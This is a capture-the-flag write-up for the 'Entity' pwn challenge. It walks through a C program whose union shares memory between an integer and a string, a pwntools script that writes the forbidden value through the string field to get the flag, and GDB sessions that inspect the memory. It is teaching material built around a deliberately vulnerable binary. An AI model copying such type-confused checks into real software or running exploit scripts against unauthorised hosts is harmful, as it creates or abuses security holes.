# Entity

Difficulty:: #easy 

## Introduction
This is a good challenge to understand how the memory is handled in `little endian` notation and how the `Union` datatypes store data and the input data is handle with `fgets`. To get the flag we only need to write a especific integer value but using the input string mode that the binary give us.

## Target data
- `Spawn Docker`: `159.65.49.148:32250` 
- `File`: `pwn_entity.zip`

## Challenge Description
*This Spooky Time of the year, what's better than watching a scary film on the TV? Well, a lot of things, like playing CTFs but you know what's definitely not better? Something coming out of your TV!*

## Enumeration

We are given the following data: 
```shell
magor$ tree pwn_entity
pwn_entity
├── entity
├── entity.c
└── flag.txt
```

This seems that apart from we have the binary we also have the C code used to compiled it. And a flag for testing wich tell us that we have to find a way to exploit to read the server files system. So first I am gonna analyse the C code file.


### entity.c

To analyse it I seek for the `main()` function and start reading:

```C
# entity.c
# ...SNIP...
static union {
    unsigned long long integer;
    char string[8];
} DataStore;
# ...SNIP...
int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
  ➊ bzero(&DataStore, sizeof(DataStore));
    printf("\nSomething strange is coming out of the TV..\n");
    while (1) {
      ➋ menu_t result = menu();
      ➌ switch (result.act) {
        case STORE_SET:
         ➍  set_field(result.field);
            break;
        case STORE_GET:
         ➎  get_field(result.field);
            break;
        case FLAG:
         ➏  get_flag();
            break;
        }
    }

}
```

At ➊ initializate a `DataStore` variable that is a [`Union datatype`](https://www.tutorialspoint.com/cprogramming/c_unions.htm)  with zero data. This `union` store a `8 bytes` char and a `8 bytes` integer **in the same address** This could be very important. And after that it locks us  in a menu ➋ to interact with the script. and only we have 3 options to interact ➌. The first one ➍ seems that we can store data, the second one ➎ seems we can retrieve the data we store and the last one ➏ give us the flag (likely under some condition).


So continue analyzing the `menu()` function to understand the flow:

#### menu

```C
# entity.c
# ...SNIP...
menu_t menu() {
    menu_t res = { 0 };
    char buf[32] = { 0 };
    printf("\n(T)ry to turn it off\n(R)un\n(C)ry\n\n>> ");
    fgets(buf, sizeof(buf), stdin);
    buf[strcspn(buf, "\n")] = 0;
    switch (buf[0]) {
    case 'T':
        res.act = STORE_SET;
        break;
    case 'R':
        res.act = STORE_GET;
        break;
    case 'C':
        res.act = FLAG;
        return res;
    default:
        puts("\nWhat's this nonsense?!");
        exit(-1);
    }
		printf("\nThis does not seem to work.. (L)ie down or (S)cream\n\n>> ");
    fgets(buf, sizeof(buf), stdin);
    buf[strcspn(buf, "\n")] = 0;
    switch (buf[0]) {
    case 'L':
        res.field = INTEGER;
        break;
    case 'S':
        res.field = STRING;
        break;
    default:
        printf("\nYou are doomed!\n");
        exit(-1);
    }
    return res;
}
# ...SNIP...
```

They give us a use guide. There are two inputs and are limited by:
1. First input: `T`  related to `set_field` , `R` related to `get_field` and `C` to the flag. otherwise it ends the execution.
2. If the first input is valid, now there is two more options `L` to select `INTEGER` field and `S` to select `STRING` field. Otherwise it ends the execution.

I can confirm that behaivor with the binary:

```shell
magor$ ./entity

Something strange is coming out of the TV..

(T)ry to turn it off
(R)un
(C)ry

>> T

This does not seem to work.. (L)ie down or (S)cream

>>
```

Well now That we know the scope of the program, Lets check what `set_field()` , `set_field()` and `get_flag()` do.

#### set_field

```C
# entity.c
# ...SNIP...
void set_field(field_t f)➊ {
    char buf[32] = {0};
    printf("\nMaybe try a ritual?\n\n>> ");
 ➋  fgets(buf, sizeof(buf), stdin);
    switch (f) {
    case INTEGER:
     ➋  sscanf(buf, "%llu", &DataStore.integer);
     ➌  if (DataStore.integer == 13371337) {
            puts("\nWhat's this nonsense?!");
            exit(-1);
        }
        break;
    case STRING:
     ➍  memcpy(DataStore.string, buf, sizeof(DataStore.string));
        break;
    }

}
# ...SNIP...
```

This function bassically has two flows, depend on what option a used before `L` to Integer or `S` to STRING. Because this election is stored in the input parameter `f` at ➊. Then it ask for another input that is limited to `32 bytes` . And The interesting thing is that if I chose the `INTEGER` option ti store the `32 bytes` value into `DataStore.integer` ➋ (with a very curious condition ➌ that if that value is `13371337` the execution ends) but if I chose `STRING` option it stored that value into the `DataStore.string` ➍.

At this point you can see that there is something strange, Basically we can choose if store a value inside to  `integer` or inside  `string` . But, remember that they are stored in a `Union` datatype that means that they both have the same memory address 👀. 


#### get_field

```C
void get_field(field_t f) {
    printf("\nAnything else to try?\n\n>> ");
    switch (f) {
    case INTEGER:
        printf("%llu\n", DataStore.integer);
        break;
    case STRING:
        printf("%.8s\n", DataStore.string);
        break;
    }
}
```

As it was expected due to the function name. The `get_field` prints the data stored in the `DataStore.integer` if I chose the `INTEGER` option or `DataStore.string` if I chose the `STRING` option. So If we use `set_field()` to write data in the `string` variable we could see the change in the `integer` variable, and vice versa, If we write in the `integer` mode, maybe we coul see the string representation (if the bytes are printable).


#### get_flag

```C
void get_flag() {
 ➊  if (DataStore.integer == 13371337) {
        system("cat flag.txt");
        exit(0);
    } else {
        puts("\nSorry, this will not work!");
    }
}
```

Now get flag also have the strange condition at ➊ (like the `set_field` function) and now we can understand why exists this condition. The challenge want we can write the `13371337` value into the `DataStore.integer` but whithout use the straigthforward way that will be writing it with the `set_function` in the `INTEGER` mode.



### Enumeration summary

The C program allow us write an read a custom [Union datatype](https://www.tutorialspoint.com/cprogramming/c_unions.htm) called `DataStore` that have two fields. The first one is a `8` bytes unsigned integer type and the second one is a 8 bytes `char` type value. But due to they use a Union datatype they both share the same memory address. If we modify one, we can see the change in the other variable too. That is the reason they only ask us that we could be able to write the value `13371337` in the integer field.


## Foothold

Before exploit it, lets see the behaivor of the binary

```shell
magor$ ./entity

Something strange is coming out of the TV..

(T)ry to turn it off
(R)un
(C)ry

>> R

This does not seem to work.. (L)ie down or (S)cream

>> L

Anything else to try?

>> 0 ➊

(T)ry to turn it off
(R)un
(C)ry

>> R

This does not seem to work.. (L)ie down or (S)cream

>> S

Anything else to try?

>>  ➋

(T)ry to turn it off
(R)un
(C)ry

>>
```

We can firs get the `DataStore.integer`  ➊ and the `DataSotre.string` ➋ to verify that both of them are in zero value.

Now lets write `a` in the string mode and check if the `integer` remains in zero or not:

```shell
magor$ ./entity

Something strange is coming out of the TV..

(T)ry to turn it off
(R)un
(C)ry

>> T

This does not seem to work.. (L)ie down or (S)cream

>> S

Maybe try a ritual?

>> a ➊

(T)ry to turn it off
(R)un
(C)ry

>> R

This does not seem to work.. (L)ie down or (S)cream

>> L

Anything else to try?

>> 2657 ➋

(T)ry to turn it off
(R)un
(C)ry

>> R

This does not seem to work.. (L)ie down or (S)cream

>> S

Anything else to try?

>> a


(T)ry to turn it off
(R)un
(C)ry

>>
```

First write `a` at ➊ and then when get the `integer` value  we got `2657` at ➋. And we already know that the integer value change because they shared the same memory address. 

To see the equivalence, first think that the variable store 8 bytes, then notice that the `a` string is stored with the equivalence `ASSCII` value `97` decimal or `0x61` hexadecimal. Then you also have to notice how the data is recieve by the [fgets()](https://www.tutorialspoint.com/c_standard_library/c_function_fgets.htm) function. It read max `n bytes` including the null-caracter. And when we enter data we press `enter` key we send another byte is the `0x0A` or `10` decimal. So fgets collects:

```
0x61 0x0A 0x00
```

But the way data is stored is in `little endian` convention. So the data is write:
```
0x000A61
```

And `0x0A61` is `2657` in decimal. an that is why we see that value when we get the data in integer mode.

Now we want to do the reverse thing. That measn that writing in `string` variable and when it reads like `integer` we get `13371337`

So we could convert the 

```python
>>>➊hex(13371337)
'0xcc07c9'
>>>➋(13371337).to_bytes(3,'big')
b'\xcc\x07\xc9'
>>>➌(13371337).to_bytes(3,'little')
b'\xc9\x07\xcc'
>>>➍(13371337).to_bytes(8,'little')
b'\xc9\x07\xcc\x00\x00\x00\x00\x00'
```

We can convert the `13371337` to hex ➊ but by default if convert it in `big endian` notation (due to this is the default and usual notation) if  we convert the int to bytes we can specify the notation, at ➋ I convert it to `big endian` notation using 3 bytes an we get the same convertion (well exactly the same not, because here we get a bytes data, with `hex()` we get a string instead. But I refer to the hex values). and at ➌ you can see that if I change to a `little endian` notation now the hex values are in reverse orden. But somenthing is still missing at this point, and that is that you have to consider the break line `\n` you see that it write the byte `0x0a` . It means ti would be `c907cc0a` and with that value we cant send exactly the `c907cc` bytes, but remember that the `fgets()` was configurated to recieve until `32 bytes` so if we send `c907cc0000000000`  like at ➍ `fgets` take `c907cc00000000000a` but when copy data to the `string` variable only copy `8 bytes` so the `0a` will be ingored!

I am gonna write a Python script using  Pwntools to send the bytes:.

With pwntools we can to have a template to start to work :

```shell
magor$ pwn template ./entity --host 159.65.49.148 --port 32250 > solve_entity.py
```

That create a template file like this:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./entity --host 159.65.49.148 --port 32250
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./entity')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '159.65.49.148'
port = int(args.PORT or 32250)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()
```


I add the folling lines to send the bytes and retrieve the flag : 

```Python
payload = (13371337).to_bytes(8,'little')

io.sendlineafter(b'>> ', b'T')
io.sendlineafter(b'>> ', b'S')
io.sendlineafter(b'>> ', payload)
io.sendlineafter(b'>> ', b'C')
```

So it looks like this:

```shell
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./entity --host 159.65.49.148 --port 32250
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./entity')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '159.65.49.148'
port = int(args.PORT or 32250)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

payload = (13371337).to_bytes(8,'little')

io.sendlineafter(b'>> ', b'T')
io.sendlineafter(b'>> ', b'S')
io.sendlineafter(b'>> ', payload)
io.sendlineafter(b'>> ', b'C')

io.interactive()
```

I execute it:

```shell
magor$ ./solve_entity.py 
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
HTB{xxxxxxxxxxxxxxxxxxxxxxxxxxxx}
[*] Got EOF while reading in interactive
```



### Go beyond

We can dig deeper analyzing the data stored in memory with GDB. We already know that the `Union` datatype reference all fields to the same memory address but lets check it out:

```shell
magor$ gdb -q entity
Reading symbols from entity...
(No debugging symbols found in entity)
(gdb)➊b main
Breakpoint 1 at 0x1443
(gdb) r
Starting program: /ctf/2022-boo/2-pwn/pwn_entity/entity

Breakpoint 1, 0x0000555555555443 in main ()
(gdb) disass main
Dump of assembler code for function main:
   0x000055555555543f <+0>:     push   %rbp
   0x0000555555555440 <+1>:     mov    %rsp,%rbp
=> 0x0000555555555443 <+4>:     sub    $0x10,%rsp
   0x0000555555555447 <+8>:     mov    0x2c22(%rip),%rax        # 0x555555558070 <stdout@GLIBC_2.2.5>
   0x000055555555544e <+15>:    mov    $0x0,%ecx
   0x0000555555555453 <+20>:    mov    $0x2,%edx
   0x0000555555555458 <+25>:    mov    $0x0,%esi
   0x000055555555545d <+30>:    mov    %rax,%rdi
   0x0000555555555460 <+33>:    callq  0x555555555090 <setvbuf@plt>
   0x0000555555555465 <+38>:    movq   $0x0,0x2c20(%rip)        # 0x555555558090 <DataStore>
   0x0000555555555470 <+49>:    lea    0xc99(%rip),%rdi        # 0x555555556110
   0x0000555555555477 <+56>:    callq  0x555555555030 <puts@plt>
   0x000055555555547c <+61>:    mov    $0x0,%eax
➌ 0x0000555555555481 <+66>:    callq  0x5555555551a5 <menu> 
   0x0000555555555486 <+71>:    mov    %rax,-0x8(%rbp)
   0x000055555555548a <+75>:    mov    -0x8(%rbp),%eax
   0x000055555555548d <+78>:    cmp    $0x2,%eax
   0x0000555555555490 <+81>:    je     0x5555555554b8 <main+121>
   0x0000555555555492 <+83>:    cmp    $0x2,%eax
   0x0000555555555495 <+86>:    ja     0x55555555547c <main+61>
   0x0000555555555497 <+88>:    test   %eax,%eax
   0x0000555555555499 <+90>:    je     0x5555555554ac <main+109>
   0x000055555555549b <+92>:    cmp    $0x1,%eax
   0x000055555555549e <+95>:    jne    0x55555555547c <main+61>
   0x00005555555554a0 <+97>:    mov    -0x4(%rbp),%eax
   0x00005555555554a3 <+100>:   mov    %eax,%edi
   0x00005555555554a5 <+102>:   callq  0x5555555552ed <set_field>
   0x00005555555554aa <+107>:   jmp    0x5555555554c3 <main+132>
--Type <RET> for more, q to quit, c to continue without paging--q
Quit
(gdb)➍b *0x0000555555555481
Breakpoint 2 at 0x555555555481
```

Here I put a breakpoint in `main` function ➊ before any other place because until the program not execute the address will be not updated. Then run it and when it stop in the start of `main` function I disass it ➋ to see a memory address where I put another breakpoint to be inside the `while` loop. I choose the address that call the `menu` function at ➌ so put the breakpoint at ➍

```shell
(gdb)➊c
Continuing.

Something strange is coming out of the TV..

Breakpoint 2, 0x0000555555555481 in main ()
(gdb)➋p &DataStore
$1 = (<data variable, no debug info> *) 0x555555558090 <DataStore>
(gdb) x/2wx 0x555555558090
0x555555558090 <DataStore>:     0x00000000      0x00000000
(gdb) x/2wx &DataStore
0x555555558090 <DataStore>:     0x00000000      0x00000000
```

Now continue the exdcution➊ and when it stop I print the  DataStore address pointer ➋. There is no much useful there. But now try examine the values stored in that address , I can do that directly with the address like at ➌ or with the  **address-of** operator `&` and the variable name like at ➍

> **Note**: I use the examinate command `x` and I tell that i want to get `2wx` it measn 2 words (here word has 4 bytes) in hexadeciaml format `x` And only that because I already knwo that the `Union` datatype `DataStore` has only `8 bytes`.

```shell
(gdb)➊c
Continuing.

(T)ry to turn it off
(R)un
(C)ry

>>➋T

This does not seem to work.. (L)ie down or (S)cream

>>➌S

Maybe try a ritual?

>>➍aabb

Breakpoint 2, 0x0000555555555481 in main () ➎
(gdb)➏x/2wx &DataStore
0x555555558090 <DataStore>:    ➐ 0x62626161    ➑ 0x0000000a 
(gdb)➒x/1gx &DataStore
0x555555558090 <DataStore>:   ➒ 0x0000000a62626161
(gdb) p 0x0000000a62626161
$3 = 44600287585 ⓫
```

Now I continue ➊ to wait the menu options and use the `set_field` ➋ in `string` mode ➌ and send `aabb` string ➍. Then the breakpoint will appear ➎ because it try to call the menu again  and I examine the `&DataStore` address again ➏. An before look that hex value remember that `a` is  `0x61` , `b` is `0x62` and `enter` (break line) is `0x0a`. So note that the first 4 bytes have the `aabb` bytes ➐ but in reverse order (because of the little endian arquitecture) and in the following 4 bytes ➑  we see the `0x0a` break line byte. Now, how do you think that this value will be interpreted in integer value?. so due to the `integer` has 8 bytes it will interpreted like ➓ (Notice that now i am telling to the examine command to show me only `1gx` ➒ that means 1 giant in hexadecimal, giant has 8 bytes). And that in deciaml is `44600287585` like at ⓫

We can verify that decimal number if continue the execution and with the menu select `get_data` in `integer` mode:
```shell
(gdb) c
Continuing.

(T)ry to turn it off
(R)un
(C)ry

>> R

This does not seem to work.. (L)ie down or (S)cream

>> L

Anything else to try?

>> 44600287585

Breakpoint 2, 0x0000555555555481 in main ()
(gdb)
```

Now look what happend if I send a null character `0x00`.

> In standart input terminal we can send non-printable characters using `CTR+V` and guide us with the equivalences in [ascii table](https://manpages.ubuntu.com/manpages/xenial/en/man7/ascii.7.html) to send a null we need to send `^@`  (Depend on the keyboard that could be differente, in my keyboard is with `CTR+v` and after that `CTR + space`) 

So lets do this:

```shell
(gdb)➊c
Continuing.

(T)ry to turn it off
(R)un
(C)ry

>> T

This does not seem to work.. (L)ie down or (S)cream

>> S

Maybe try a ritual?

>>➋ab^@

Breakpoint 2, 0x0000555555555481 in main ()
(gdb) x/2wx &DataStore
0x555555558090 <DataStore>:  ➌  0x0a006261      0x00000000
(gdb)
```

I continue the execution ➊ and again use the `set_field` with the `string` mode to send `ab^@` ➋ (please read the note above about the `^@`) it will send the bytes `ab` and `0x00` with the default break line `0x0a` we can check it out when examinate the memory address an see that there is `00` between `0a` and `62`➌. 

Now lets send the `abc` with padding of null bytes to complete 8 bytes:

```shell
(gdb) c
Continuing.

(T)ry to turn it off
(R)un
(C)ry

>> T

This does not seem to work.. (L)ie down or (S)cream

>> S

Maybe try a ritual?

>> abc^@^@^@^@^@

Breakpoint 2, 0x0000555555555481 in main ()
(gdb) x/2wx &DataStore
0x555555558090 <DataStore>: ➊   0x00636261      0x00000000
(gdb)
```

And note that there is no `0x0a` breakline byte now! ➊. 

And to finish let's see how if i write in `integer` mode the address also change (verify that the `Union` datatype give the same address to all of the fields) I wanna write the integer `6513249`:

```shell
(gdb) c
Continuing.

(T)ry to turn it off
(R)un
(C)ry

>> T

This does not seem to work.. (L)ie down or (S)cream

>> L

Maybe try a ritual?

>>➊6513249

Breakpoint 2, 0x0000555555555481 in main ()
(gdb) x/2wx &DataStore
0x555555558090 <DataStore>:   ➋  0x00636261      0x00000000
(gdb) p 0x00636261
$4 = 6513249 ➌
(gdb) c
Continuing.

(T)ry to turn it off
(R)un
(C)ry

>> R

This does not seem to work.. (L)ie down or (S)cream

>> S

Anything else to try?

>> abc ➍

Breakpoint 2, 0x0000555555555481 in main ()
(gdb)
```

Continue again but now I use the `set_field` in `integer` mode. and send the  `6513249` ➊ and examinate the memory and look that it store `0x636261` ➋ you can see that this hex value is exactly the integer we send ➌. And look that if we conitnue and `get_field` in  `string` mode it returns the `abc` string! ➍.